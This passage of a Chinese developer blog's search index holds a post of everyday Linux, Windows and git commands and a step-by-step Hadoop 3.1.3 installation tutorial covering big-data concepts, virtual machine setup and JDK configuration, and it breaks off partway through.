<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>写博客的初衷</title>
    <url>/2020/07/29/16035/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><p>从工作到现在，码了很多代码了，有简单的，有麻烦的，很多的东西当时实现了，经过一段时间，后面又遇到同样的场景，没办法，又得重来一遍，使用很多开源的组件，每次都去网上找别人的博客，质量参差不齐，所以新建一个博客以记录平时开发过程中遇到的一些场景、问题。方便后续查找，基本是属于自己的一个笔记吧！哈哈！</p><p>常见软件安装破解教程在百度网盘<code>/私人/软件破解</code>下。</p><p>linux常用命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看端口占用</span></span><br><span class="line">lsof -i:8000</span><br><span class="line">netstat -tunlp |grep 8000</span><br><span class="line"><span class="meta">#</span><span class="bash"> 杀进程</span></span><br><span class="line">kill -9 pid</span><br><span class="line"><span class="meta">#</span><span class="bash"> 防火墙开端口</span></span><br><span class="line">firewall-cmd --zone=public --add-port=6379/tcp --permanent</span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启防火墙</span></span><br><span class="line">service firewalld restart</span><br></pre></td></tr></table></figure><p>windows常用命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看端口占用</span></span><br><span class="line">netstat -ano |findstr "8000"</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看占用详情</span></span><br><span class="line">tasklist |findstr "pid"</span><br><span class="line"><span class="meta">#</span><span class="bash"> 杀进程</span></span><br><span class="line">taskkill /f /t /im "pid"</span><br></pre></td></tr></table></figure><p>git常用命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加远程库</span></span><br><span class="line">git remote add roncoo https://gitee.com/roncoocom/roncoo-education-web.git</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
  </entry>
  <entry>
    <title>hadoop安装</title>
    <url>/2022/04/11/21104/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><h1 id="一、大数据概论"><a href="#一、大数据概论" class="headerlink" title="一、大数据概论"></a>一、大数据概论</h1><p><strong>1.1.大数据概念</strong><br>大数据（BigData）：指无法在一定时间范围内用常规软件工具进行捕捉、管理和处理的数据集合，是需要新处理模式才能具有更强的决策力、洞察发现力和流程优化能力的海量、高增长率和多样化的信息资产。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">按顺序给出数据存储单位：</span><br><span class="line">bit、Byte、KB、MB、GB、TB、PB、EB、ZB、YB、BB、NB、DB。</span><br><span class="line">1Byte &#x3D; 8bit 1K &#x3D; 1024Byte 1MB &#x3D; 1024K</span><br><span class="line">1G &#x3D; 1024M 1T &#x3D; 1024G 1P&#x3D; 1024T</span><br></pre></td></tr></table></figure><p>大数据主要解决，海量数据的采集、存储和分析计算问题。</p><a id="more"></a><p><strong>1.2.大数据特点（4V）</strong><br><strong>（1）Volume（大量）</strong></p><blockquote><p>截至目前，人类生产的所有印刷材料的数据量是200PB，而历史上全人类总共说过的话的数据量大约是5EB。当前，典型个人计算机硬盘的容量为TB量级，而一些大企业的数据量已经接近EB量级。</p></blockquote><p><strong>（2）Velocity（高速）</strong></p><blockquote><p>这是大数据区分于传统数据挖掘的最显著特征。根据IDC的”数字宇宙”的报<br>告，预计到2025年，全球数据使用量将达到163ZB。在如此海量的数据面前，处理数据的效率就是企业的生命。</p></blockquote><p><strong>（3）Variety（多样）</strong></p><blockquote><p>这种类型的多样性也让数据被分为结构化数据和非结构化数据。相对于以往便于存储的以数据库/文本为主的结构化数据，非结构化数据越来越多，包括网络日志、音频、视频、图<br>片、地理位置信息等，这些多类型的数据对数据的处理能力提出了更高要求。</p></blockquote><p><strong>（4）Value（低价值密度）</strong></p><blockquote><p>价值密度的高低与数据总量的大小成反比。如何快速对有价值数据”提纯”成为目前大数据背景下待解决的难题。</p></blockquote><p><strong>1.3.大数据应用场景</strong><br>（1）抖音：推荐的都是你喜欢的视频<br>（2）电商站内广告推荐：给用户推荐可能喜欢的商品<br>（3）零售：分析用户消费习惯，为用户购买商品提供方便，从而提升商品销量。经典案例，纸尿布+啤酒。<br><img src="/2022/04/11/21104/1.png" alt></p><p>（4）物流仓储：京东物流，上午下单下午送达、下午下单次日上午送达<br>（5）保险：海量数据挖掘及风险预测，助力保险行业精准营销，提升精细化定价能力。<br>（6）金融：多维度体现用户特征，帮助金融机构推荐优质客户，防范欺诈风险。<br>（7）房产：大数据全面助力房地产行业，打造精准投策与营销，选出更合适的地，建造更合适的楼，卖给更合适的人。<br>（8）人工智能 + 5G + 物联网 + 虚拟与现实<br><img src="/2022/04/11/21104/2.png" alt="在这里插入图片描述"><br><strong>1.4.大数据发展前景</strong><br>（1）党的十九大提出”推动互联网、大数据、人工智能和实体经济深度融合”。<br>（2）2020年初，中央推出34万亿”新基建”投资计划<br><img src="/2022/04/11/21104/3.png" alt="在这里插入图片描述"><br>（3）下一个风口<br>2020年是5G的元年，国家在大力铺设5G设备，2021年就是5G手机应用的开始，也是大数据要爆发的1年。5G带来的是每秒钟10g的数据，会给每家公司都带来海量的数据。那么传统的Java工具根本解决不了海量数据的存储。就更不用说海量数据的计算了。如果你对5G的感触不够深，可以回忆一下3G和4G的区别。3G时只能打电话、发短信，当时还觉得很好，觉得3G不错。但是4G来了后，大家很少打电话和发短信了，都改为语音、视频、直播、网上购物等生活方式，带火了淘宝、京东、美团、字节跳动等企业。没有跟上节奏的百度，有点摇摇欲坠。<br>自古不变的真理：先入行者吃肉，后入行者喝汤，最后到的买单！<br>（4）人才紧缺、竞争压力小<br><strong>1.5.大数据部门间业务流程分析</strong><br><img src="/2022/04/11/21104/4.png" alt="在这里插入图片描述"><br><strong>1.6.大数据部门内组织结构</strong><br><img src="/2022/04/11/21104/5.png" alt="在这里插入图片描述"></p><h1 id="二、Hadoop概述"><a href="#二、Hadoop概述" class="headerlink" title="二、Hadoop概述"></a>二、Hadoop概述</h1><p><strong>2.1. Hadoop 是什么</strong><br>1） Hadoop是一个由Apache基金会所开发的分布式系统基础架构。<br>2）主要解决，海量数据的存储和海量数据的分析计算问题。<br>3）广义上来说，Hadoop通常是指一个更广泛的概念——Hadoop生态圈。<br><img src="/2022/04/11/21104/6.png" alt="在这里插入图片描述"><br><strong>2.2. Hadoop发展历史（了解）</strong><br>1）Hadoop创始人Doug<br>Cutting，为了实现与Google类似的全文搜索功能，他在Lucene框架基础上进行优化升级，查询引擎和索引引擎。<br>2）2001年年底Lucene成为Apache基金会的一个子项目。<br>3）对于海量数据的场景，Lucene框架面对与Google同样的困难，存储海量数据困难，检索海量速度慢。<br>4）学习和模仿Google解决这些问题的办法 ：微型版Nutch。<br>5）可以说Google是Hadoop的思想之源（Google在大数据方面的三篇论文）</p><blockquote><p>GFS —&gt;HDFS<br>Map-Reduce —&gt;MR<br>BigTable —&gt;HBase</p></blockquote><p>6）2003-2004年，Google公开了部分GFS和MapReduce思想的细节，以此为基础Doug Cutting等人用了2年业余时间实现了DFS和MapReduce机制，使Nutch性能飙升。<br>7）2005 年Hadoop 作为 Lucene的子项目Nutch的一部分正式引入Apache基金会。<br>8）2006 年 3 月份，Map-Reduce和Nutch Distributed File System（NDFS）分别被纳入到 Hadoop<br>项目中，Hadoop就此正式诞生，标志着大数据时代来临。<br>9）名字来源于Doug Cutting儿子的玩具大象<br><strong>2.3. Hadoop三大发行版本（了解）</strong><br>Hadoop 三大发行版本：Apache、Cloudera、Hortonworks。<br>Apache 版本最原始（最基础）的版本，对于入门学习最好。2006<br>Cloudera 内部集成了很多大数据框架，对应产品 CDH。2008<br>Hortonworks 文档较好，对应产品 HDP。2011<br>Hortonworks 现在已经被 Cloudera 公司收购，推出新的品牌 CDP。<br><img src="/2022/04/11/21104/7.png" alt="在这里插入图片描述"><br><img src="/2022/04/11/21104/8.png" alt="在这里插入图片描述"><br><strong>1 ）Apache Hadoop</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官网地址：http:&#x2F;&#x2F;hadoop.apache.org</span><br><span class="line">下载地址：https:&#x2F;&#x2F;hadoop.apache.org&#x2F;releases.html</span><br></pre></td></tr></table></figure><p><strong>2 ）Cloudera Hadoop</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官网地址：https:&#x2F;&#x2F;www.cloudera.com&#x2F;downloads&#x2F;cdh</span><br><span class="line">下载地址：https:&#x2F;&#x2F;docs.cloudera.com&#x2F;documentation&#x2F;enterprise&#x2F;6&#x2F;release-notes&#x2F;topics&#x2F;rg_cdh_6_download.html</span><br></pre></td></tr></table></figure><blockquote><p>（1）2008 年成立的 Cloudera 是最早将 Hadoop 商用的公司，为合作伙伴提供Hadoop 的商用解决方案，主要是包括支持、咨询服务、培训。<br>（2 ）2009 年 年 Hadoop 的创始人 Doug Cutting 也加盟Cloudera公司。Cloudera 产品主要为 CDH，Cloudera Manager，Cloudera Support<br>（3）CDH 是 Cloudera 的 Hadoop 发行版，完全开源，比 Apache Hadoop在兼容性，安全性，稳定性上有所增强。Cloudera 的标价为每年每个节点10000 美元。<br>（4）ClouderaManager是集群的软件分发及管理监控平台，可以在几个小时内部署好一个Hadoop 集群，并对集群的节点及服务进行实时监控。</p></blockquote><p><strong>3） Hortonworks Hadoop</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">官网地址：https:&#x2F;&#x2F;hortonworks.com&#x2F;products&#x2F;data-center&#x2F;hdp&#x2F;</span><br><span class="line">下载地址：https:&#x2F;&#x2F;hortonworks.com&#x2F;downloads&#x2F;#data-platform</span><br></pre></td></tr></table></figure><blockquote><p>（1）2011 年成立的 Hortonworks 是雅虎与硅谷风投公司 Benchmark Capital合资组建。<br>（2）公司成立之初就吸纳了大约 25 名至 30 名专究 门研究 Hadoop的雅虎工程师，上述 工程师均在 2005 年开始协助雅虎开发 Hadoop ，贡献了Hadoop80% 的代码。<br>（3）Hortonworks 的主打产品是 Hortonworks DataPlatform（HDP），也同样是 100%开 源的产品，HDP 除常见的项目外还包括了Ambari，一款开源的安装和管理系统。<br>（4）2018 年 Hortonworks 目前 已经被 Cloudera 公司收购。</p></blockquote><p><strong>2.4. Hadoop优势（4高）</strong><br>1）高可靠性：Hadoop底层维护多个数据副本，所以即使Hadoop某个计算元素或存储出现故障，也不会导致数据的丢失。<br><img src="/2022/04/11/21104/9.png" alt="在这里插入图片描述"><br>2）高扩展性：在集群间分配任务数据，可方便的扩展数以千计的节点。<br><img src="/2022/04/11/21104/10.png" alt="在这里插入图片描述"></p><p>3）高效性：在MapReduce的思想下，Hadoop是并行工作的，以加快任务处<br>理速度。<br><img src="/2022/04/11/21104/11.png" alt="在这里插入图片描述"></p><p>4）高容错性：能够自动将失败的任务重新分配。<br><img src="/2022/04/11/21104/12.png" alt="在这里插入图片描述"><br><strong>2.5. Hadoop组成（面试重点）</strong><br><img src="/2022/04/11/21104/13.png" alt="在这里插入图片描述"><br>在 Hadoop1.x 时 代，Hadoop中的MapReduce同时处理业务逻辑运算和资源的调度，耦合性较大。在Hadoop2.x时代，增加了Yarn。Yarn只负责资源 的 调 度 ，MapReduce只负责运算。Hadoop3.x在组成上没有变化。<br><strong>2.5.1 HDFS架构概述</strong><br>Hadoop Distributed File System，简称 HDFS，是一个分布式文件系统。</p><blockquote><p>1）NameNode（nn）：存储文件的元数据，如文件名，文件目录结构，文件属性（生成时间、副本数、文件权限），以及每个文件的块列表和块所在的DataNode等。<br>2）DataNode(dn)：在本地文件系统存储文件块数据，以及块数据的校验和。<br>3）SecondaryNameNode(2nn)：每隔一段时间对NameNode元数据备份。</p></blockquote><p><strong>2.5.2 YARN架构概述</strong><br>Yet Another Resource Negotiator 简称 YARN ，另一种资源协调者，是 Hadoop的资源管理器。<br><img src="/2022/04/11/21104/14.png" alt="在这里插入图片描述"></p><blockquote><p>1）ResourceManager（RM）：整个集群资源（内存、CPU等）的老大<br>3）ApplicationMaster（AM）：单个任务运行的老大<br>2）NodeManager（NM）：单个节点服务器资源老大<br>4）Container：容器，相当一台独立的服务器，里面封装了任务运行所需要的资源，如内存、CPU、磁盘、网络等。<br>说明1：客户端可以有多个<br>说明2：集群上可以运行多个ApplicationMaster<br>说明3：每个NodeManager上可以有多个Container</p></blockquote><p><strong>2.5.3. MapReduce架构概述</strong><br>MapReduce 将计算过程分为两个阶段：Map 和 Reduce</p><blockquote><p>1）Map 阶段并行处理输入数据<br>2）Reduce 阶段对 Map 结果进行汇总</p></blockquote><p><img src="/2022/04/11/21104/15.png" alt="在这里插入图片描述"></p><p><strong>2.5.4. HDFS、YARN、MapReduce三者关系</strong><br><img src="/2022/04/11/21104/16.png" alt="在这里插入图片描述"></p><p><strong>2.6. 大数据技术生态体系</strong><br><img src="/2022/04/11/21104/17.png" alt="在这里插入图片描述"><br>图中涉及的技术名词解释如下：</p><blockquote><p>1）Sqoop：Sqoop 是一款开源的工具，主要用于在 Hadoop、Hive与传统的数据库（MySQL）间进行数据的传递，可以将一个关系型数据库（例如：MySQL，Oracle 等）中的数据导进到 Hadoop 的HDFS 中，也可以将 HDFS 的数据导进到关系型数据库中。 2）Flume：Flume是一个高可用的，高可靠的，分布式的海量日志采集、聚合和传输的系统，Flume支持在日志系统中定制各类数据发送方，用于收集数据；<br>3）Kafka：Kafka 是一种高吞吐量的分布式发布订阅消息系统；<br>4）Spark：Spark是当前最流行的开源大数据内存计算框架。可以基Hadoop<br>上存储的大数据进行计算。<br>5）Flink：Flink是当前最流行的开源大数据内存计算框架。用于实时计算的场景较多。<br>6）Oozie：Oozie 是一个管理 Hadoop作业（job）的工作流程调度管理系统。<br>7）Hbase：HBase是一个分布式的、面向列的开源数据库。HBase不同于一般的关系数据库，它是一个适合于非结构化数据存储的数据库。<br>8）Hive：Hive 是基于 Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的<br>SQL 查询功能，可以将 SQL 语句转换为 MapReduce任务进行运行。其优点是学习成本低，可以通过类 SQL 语句快速实现简单的MapReduce 统计，不必开发专门的 MapReduce应用，十分适合数据仓库的统计分析。<br>9）ZooKeeper：它是一个针对大型分布式系统的可靠协调系统，提供的功能包括：配置维护、名字服务、分布式同步、组服务等。</p></blockquote><p><strong>2.7. 推荐系统框架图</strong><br><img src="/2022/04/11/21104/18.png" alt="在这里插入图片描述"></p><h1 id="三、Hadoop-运行环境搭建-（开发-重点）"><a href="#三、Hadoop-运行环境搭建-（开发-重点）" class="headerlink" title="三、Hadoop 运行环境搭建 （开发 重点）"></a>三、Hadoop 运行环境搭建 （开发 重点）</h1><h2 id="3-1-模板虚拟机环境准备"><a href="#3-1-模板虚拟机环境准备" class="headerlink" title="3.1 模板虚拟机环境准备"></a>3.1 模板虚拟机环境准备</h2><p><strong>0）安装模板虚拟机</strong><br>IP地址192.168.10.100、主机名称hadoop100、内存4G、硬盘50G</p><p><strong>参考链接:</strong><br><a href="https://blog.csdn.net/m0_52435951/article/details/123987674?spm=1001.2014.3001.5501" target="_blank" rel="noopener">大数据技术——模板虚拟机环境准备</a></p><p><strong>1）hadoop100虚拟机配置要求如下（本文Linux系统全部以CentOS-7.5-x86-1804为例）</strong><br>（1）使用yum安装需要虚拟机可以正常上网，yum安装前可以先测试下虚拟机联网情况<br><img src="/2022/04/11/21104/19.png" alt="在这里插入图片描述"><br>（2）安装 epel-release</p><blockquote><p>注：Extra Packages for Enterprise Linux是为”红帽系”的操作系统提供额外的软件包，适用于RHEL、CentOS 和<br>Scientific Linux。相当于是一个软件仓库，大多数 rpm包在官方repository中是找不到的）</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop100 ~]# yum install -y epel-release</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/20.png" alt="在这里插入图片描述"><br><strong>（3）注意：如果 Linux安装的是最小系统版，还需要安装如下工具；如果安装的是Linux桌面标准版，不需要执行如下操作</strong><br>net-tool：工具包集合，包含 ifconfig 等命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop100 ~]# yum install -y net-tools</span><br></pre></td></tr></table></figure><p>vim：编辑器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop100 ~]# yum install -y vim</span><br></pre></td></tr></table></figure><p><strong>2 ） 关闭防火墙</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop100 ~]# systemctl stop firewalld</span><br><span class="line">[root@hadoop100 ~]# systemctl disable firewalld.service</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/21.png" alt="在这里插入图片描述"></p><p>注意：在企业开发时，通常单个服务器的防火墙时关闭的。公司整体对外会设置非常安全的防火墙<br><strong>3 ） 创建 xusheng用户 ，并修改 xusheng用户的密码</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop100 ~]# useradd xusheng</span><br><span class="line">[root@hadoop100 ~]# passwd xusheng</span><br></pre></td></tr></table></figure><p>自己设置名称和密码<br><strong>4 ） 配置 xusheng用户具有 root 权限 ， 方便 后期加 加 sudo 执行 root<br>权限的命令</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop100 ~]# vim &#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure><p>修改/etc/sudoers 文件，在%wheel 这行下面添加一行，如下所示：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root ALL&#x3D;(ALL) ALL</span><br><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel ALL&#x3D;(ALL) ALL</span><br><span class="line">xushengALL&#x3D;(ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/22.png" alt="在这里插入图片描述"><br><strong>注意：xusheng这一行不要直接放到 root 行下面，因为所有用户都属于 wheel组，你先配置了 xusheng具有免密功能，但是程序执行到%wheel行时，该功能又被覆盖回需要密码。所以 xusheng要放到%wheel 这行下面。</strong><br><img src="/2022/04/11/21104/23.png" alt="在这里插入图片描述"><br><strong>5 ） 在/opt 目录下创建文件夹 ，并修改所属主和所属组</strong><br>（1）在/opt 目录下创建 module、software 文件夹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop100 ~]# mkdir &#x2F;opt&#x2F;module</span><br><span class="line">[root@hadoop100 ~]# mkdir &#x2F;opt&#x2F;software</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/24.png" alt="在这里插入图片描述"></p><p>（2）修改 module、software 文件夹的所有者和所属组均为 xusheng用户</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop100 ~]# chown xusheng:xusheng &#x2F;opt&#x2F;module</span><br><span class="line">[root@hadoop100 ~]# chown xusheng:xusheng &#x2F;opt&#x2F;software</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/25.png" alt="在这里插入图片描述"></p><p>（3）查看 module、software 文件夹的所有者和所属组</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop100 opt]$ ll</span><br><span class="line">总用量 0</span><br><span class="line">drwxr-xr-x. 2 xusheng xusheng 6 4月   7 20:36 module</span><br><span class="line">drwxr-xr-x. 2 xusheng xusheng 6 4月   7 20:36 software</span><br></pre></td></tr></table></figure><p><strong>6）卸载虚拟机自带的 JDK</strong><br><strong>注意：如果你的虚拟机是最小化安装不需要执行这一步。</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop100 ~]# rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br></pre></td></tr></table></figure><p>➢ rpm -qa：查询所安装的所有 rpm 软件包<br>➢ grep -i：忽略大小写<br>➢ xargs -n1：表示每次只传递一个参数<br>➢ rpm -e –nodeps：强制卸载软件<br>查询<br><img src="/2022/04/11/21104/26.png" alt="在这里插入图片描述"><br>卸载<br><img src="/2022/04/11/21104/27.png" alt="在这里插入图片描述"></p><p><strong>7 ）重启虚拟机</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop100 ~]# reboot</span><br></pre></td></tr></table></figure><h2 id="3-2-克隆虚拟机"><a href="#3-2-克隆虚拟机" class="headerlink" title="3.2 克隆虚拟机"></a>3.2 克隆虚拟机</h2><p><strong>1 ） 利用模板机 hadoop100 ，克隆 三台虚拟机： ：hadoop102 hadoop103<br>hadoop104</strong><br>注意：克隆时，要先关闭 hadoop100<br>hadoop100右键–》管理–》克隆<br><strong>2 ）修改 克隆机 IP ，以下以 hadoop102 举例说明</strong><br>（1）修改克隆虚拟机的静态 IP</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop100 ~]# vim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg- ens33</span><br><span class="line">[root@hadoop100 ~]# vim &#x2F;etc&#x2F;hostname</span><br><span class="line">[root@hadoop100 ~]# vim &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p>改成</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DEVICE&#x3D;ens33</span><br><span class="line">TYPE&#x3D;Ethernet</span><br><span class="line">ONBOOT&#x3D;yes</span><br><span class="line">BOOTPROTO&#x3D;static</span><br><span class="line">NAME&#x3D;&quot;ens33&quot;</span><br><span class="line">IPADDR&#x3D;192.168.10.102</span><br><span class="line">PREFIX&#x3D;24</span><br><span class="line">GATEWAY&#x3D;192.168.10.2</span><br><span class="line">DNS1&#x3D;192.168.10.2</span><br></pre></td></tr></table></figure><p>（2）查看 Linux 虚拟机的虚拟网络编辑器，编辑-&gt;虚拟网络编辑器-&gt;VMnet8</p><h2 id="3-3-在hadoop102安装JDK"><a href="#3-3-在hadoop102安装JDK" class="headerlink" title="3.3 在hadoop102安装JDK"></a>3.3 在hadoop102安装JDK</h2><p><strong>1）卸载现有JDK</strong><br>注意：安装JDK前，一定确保提前删除了虚拟机自带的JDK。详细步骤见问文档3.1（6）节中卸载JDK步骤。<br><strong>2）用XShell传输工具将JDK导入到opt目录下面的software文件夹下面</strong></p><p><img src="/2022/04/11/21104/28.png" alt="在这里插入图片描述"><br><img src="/2022/04/11/21104/29.png" alt="在这里插入图片描述"><br><strong>3）在Linux系统下的opt目录中查看软件包是否导入成功</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ ls &#x2F;opt&#x2F;software&#x2F;</span><br></pre></td></tr></table></figure><p>看到如下结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jdk-8u212-linux-x64.tar.gz</span><br></pre></td></tr></table></figure><p><strong>4）解压JDK到/opt/module目录下</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 software]$ tar -zxvf jdk-8u212-linux-x64.tar.gz -C &#x2F;opt&#x2F;module&#x2F;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/30.png" alt="在这里插入图片描述"></p><p><strong>5）配置JDK环境变量</strong><br>（1）新建/etc/profile.d/my_env.sh文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ sudo vim &#x2F;etc&#x2F;profile.d&#x2F;my_env.sh</span><br></pre></td></tr></table></figure><p>添加如下内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#JAVA_HOME</span><br><span class="line">export JAVA_HOME&#x3D;&#x2F;opt&#x2F;module&#x2F;jdk1.8.0_212</span><br><span class="line">export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin</span><br></pre></td></tr></table></figure><p>（2）保存后退出<br>:wq<br>（3）source一下/etc/profile文件，让新的环境变量PATH生效</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p><strong>6）测试JDK是否安装成功</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ java -version</span><br></pre></td></tr></table></figure><p>如果能看到以下结果，则代表Java安装成功。<br>java version “1.8.0_212”<br><img src="/2022/04/11/21104/31.png" alt="在这里插入图片描述"></p><p>注意：重启（如果java -version可以用就不用重启）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ sudo reboot</span><br></pre></td></tr></table></figure><h2 id="3-4-在hadoop102安装Hadoop"><a href="#3-4-在hadoop102安装Hadoop" class="headerlink" title="3.4 在hadoop102安装Hadoop"></a>3.4 在hadoop102安装Hadoop</h2><p>Hadoop下载地址：<a href="https://archive.apache.org/dist/hadoop/common/hadoop-3.1.3/" target="_blank" rel="noopener">https://archive.apache.org/dist/hadoop/common/hadoop-3.1.3/</a><br><strong>1）用XShell文件传输工具将hadoop-3.1.3.tar.gz导入到opt目录下面的software文件夹下面</strong></p><p><img src="/2022/04/11/21104/32.png" alt="在这里插入图片描述"><br><strong>2）进入到Hadoop安装包路径下</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ cd &#x2F;opt&#x2F;software&#x2F;</span><br></pre></td></tr></table></figure><p><strong>3）解压安装文件到/opt/module下面</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 software]$ tar -zxvf hadoop-3.1.3.tar.gz -C &#x2F;opt&#x2F;module&#x2F;</span><br></pre></td></tr></table></figure><p><strong>4）查看是否解压成功</strong></p><blockquote><p>[xusheng@hadoop102 software]$ ls /opt/module/ hadoop-3.1.3</p></blockquote><p><strong>5）将Hadoop添加到环境变量</strong><br>（1）获取Hadoop安装路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ pwd</span><br><span class="line">&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3</span><br></pre></td></tr></table></figure><p>（2）打开/etc/profile.d/my_env.sh文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ sudo vim &#x2F;etc&#x2F;profile.d&#x2F;my_env.sh</span><br></pre></td></tr></table></figure><p>在my_env.sh文件末尾添加如下内容：（shift+g）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#HADOOP_HOME</span><br><span class="line">export HADOOP_HOME&#x3D;&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3</span><br><span class="line">export PATH&#x3D;$PATH:$HADOOP_HOME&#x2F;bin</span><br><span class="line">export PATH&#x3D;$PATH:$HADOOP_HOME&#x2F;sbin</span><br></pre></td></tr></table></figure><p>保存并退出： :wq<br>（3）让修改后的文件生效</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><p><strong>6）测试是否安装成功</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ hadoop version</span><br><span class="line">Hadoop 3.1.3</span><br></pre></td></tr></table></figure><p><strong>7）重启（如果Hadoop命令不能用再重启虚拟机）</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ sudo reboot</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/33.png" alt="在这里插入图片描述"></p><h2 id="3-5-Hadoop目录结构"><a href="#3-5-Hadoop目录结构" class="headerlink" title="3.5 Hadoop目录结构"></a>3.5 Hadoop目录结构</h2><p><strong>1）查看Hadoop目录结构</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 176</span><br><span class="line">drwxr-xr-x. 2 xusheng xusheng    183 9月  12 2019 bin</span><br><span class="line">drwxr-xr-x. 3 xusheng xusheng     20 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 xusheng xusheng    106 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 xusheng xusheng     20 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 xusheng xusheng    288 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 xusheng xusheng 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 xusheng xusheng  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 xusheng xusheng   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 xusheng xusheng   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 xusheng xusheng     31 9月  12 2019 share</span><br><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$</span><br></pre></td></tr></table></figure><p><strong>2）重要目录</strong><br>（1）bin目录：存放对Hadoop相关服务（hdfs，yarn，mapred）进行操作的脚本<br>（2）etc目录：Hadoop的配置文件目录，存放Hadoop的配置文件<br>（3）lib目录：存放Hadoop的本地库（对数据进行压缩解压缩功能）<br>（4）sbin目录：存放启动或停止Hadoop相关服务的脚本<br>（5）share目录：存放Hadoop的依赖jar包、文档、和官方案例</p><h1 id="四、Hadoop运行模式"><a href="#四、Hadoop运行模式" class="headerlink" title="四、Hadoop运行模式"></a>四、Hadoop运行模式</h1><p>1）Hadoop官方网站：<a href="http://hadoop.apache.org/" target="_blank" 